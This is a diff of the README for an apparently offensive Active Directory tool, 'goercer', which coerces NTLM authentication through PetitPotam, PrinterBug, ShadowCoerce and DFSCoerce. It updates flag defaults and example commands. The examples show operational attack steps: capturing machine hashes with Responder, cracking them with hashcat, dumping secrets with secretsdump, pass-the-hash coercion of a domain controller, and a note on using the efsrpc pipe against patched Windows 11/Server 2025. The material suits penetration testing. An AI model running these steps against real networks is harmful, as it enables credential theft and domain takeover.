@@ -173,13 +173,13 @@ All flags use the modern GNU-style format with short (`-t`) and long (`--target`
 | Flag | Long Form | Default | Description | Valid Values |
 |------|-----------|---------|-------------|--------------|
 | `-m` | `--method` | `petitpotam` | Coercion method to use | `petitpotam`, `spoolsample`, `shadowcoerce`, `dfscoerce` |
-| | `--pipe` | `lsarpc` | Named pipe (PetitPotam only) | `lsarpc`, `efsr`, `samr`, `netlogon`, `lsass` |
+| | `--pipe` | `efsrpc` | Named pipe (PetitPotam only) | `lsarpc`, `efsr`, `samr`, `netlogon`, `lsass` |
 | | `--proxy` | *(none)* | SOCKS5 proxy URL for pivoting | `socks5://127.0.0.1:1080` |
-| `-v` | `--verbose` | `false` | Enable debug output (59 DEBUG statements) | *(boolean flag, no value)* |
+| `-v` | `--verbose` | `false` | Enable debug output (60 DEBUG statements) | *(boolean flag, no value)* |
 | `-h` | `--help` | - | Display help message and exit | *(boolean flag, no value)* |
 
 **Method Details**:
-- `petitpotam`: MS-EFSRPC - **6 opnums**, works on Server 2016-2022 unpatched/partially patched (blocked on fully patched Win11/Server 2025)
+- `petitpotam`: MS-EFSRPC - **6 opnums**, works on Server 2016-2022 unpatched/partially patched (when using `lsarpc` pipe, blocked on fully patched Win11/Server 2025; use `efsrpc` pipe for Win11/Server 2025)
 - `spoolsample`: MS-RPRN - **3 callbacks**, requires Print Spooler service running, **most reliable on patched systems**
 - `shadowcoerce`: MS-FSRVP - Requires Volume Shadow Copy (VSS) service configured
 - `dfscoerce`: MS-DFSNM - Requires DFS Namespaces role installed (rarely works)
@@ -630,7 +630,7 @@ All functions accept a UNC path as the `FileName` parameter, triggering authenti
 ```bash
 # Capture machine account hash
 sudo responder -I eth0 -v
-./goercer <DC> <attacker_IP> <user> <pass> <domain> spoolsample
+./goercer -t <DC> -l <attacker_IP> -u <user> -p <pass> -d <domain> -m spoolsample
 
 # Responder captures: MACHINE$::DOMAIN:<hash>
 # Crack with hashcat: hashcat -m 5600 hash.txt wordlist.txt
@@ -642,7 +642,7 @@ sudo responder -I eth0 -v
 secretsdump.py 'DOMAIN/user:password@<DC>'
 
 # Use that hash to authenticate for coercion
-./goercer <DC> <attacker_IP> user 8846f7eaee8fb117ad06bdd830b7586c DOMAIN spoolsample
+./goercer -t <DC> -l <attacker_IP> -u user -H 8846f7eaee8fb117ad06bdd830b7586c -d DOMAIN -m spoolsample
 ```
 
 ### 2. NTLM Relay to LDAP (Privilege Escalation)
